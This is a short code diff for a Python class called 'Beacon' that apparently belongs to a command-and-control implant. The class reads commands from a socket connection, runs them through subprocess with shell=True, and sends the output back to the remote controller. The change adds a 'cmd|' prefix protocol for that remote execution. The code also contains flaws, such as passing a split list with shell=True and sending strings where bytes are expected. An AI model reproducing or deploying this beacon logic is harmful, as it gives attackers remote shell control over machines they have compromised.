@@ -29,18 +29,23 @@ class Beacon:
                   break
                if self.debugging == True:
                   print("Received:",data)
-               try:
-                  ps = subprocess.run(data, shell=True, capture_output=True,check=True)
-                  if self.debugging == True:
-                     print("Sending:" ,ps.stdout)
-                  if ps.stdout != None and ps.stdout!= "":
-                     self.sock.send(ps.stdout)
-                  else:
-                     self.sock.send("SUCCESS")
-               except Exception as e:
-                  error_msg = f"ERROR: {str(e)}"
-                  print(error_msg)
-                  self.sock.send(error_msg.encode())
+               split = data.split("|")
+               if split[0] == "cmd":
+                  try:
+                     command = split[1].split(" ")
+                     ps = subprocess.run(command, shell=True, capture_output=True,check=True)
+                     if self.debugging == True:
+                        print("Sending:" ,ps.stdout)
+                     if ps.stdout != None and ps.stdout!= "":
+                        self.sock.send(ps.stdout)
+                     else:
+                        self.sock.send("SUCCESS")
+                  except Exception as e:
+                     error_msg = f"ERROR: {str(e)}"
+                     print(error_msg)
+                     self.sock.send(error_msg.encode())
+               else:
+                  self.sock.send("Unknown Error".encode())
             except socket.timeout:
                 continue
 
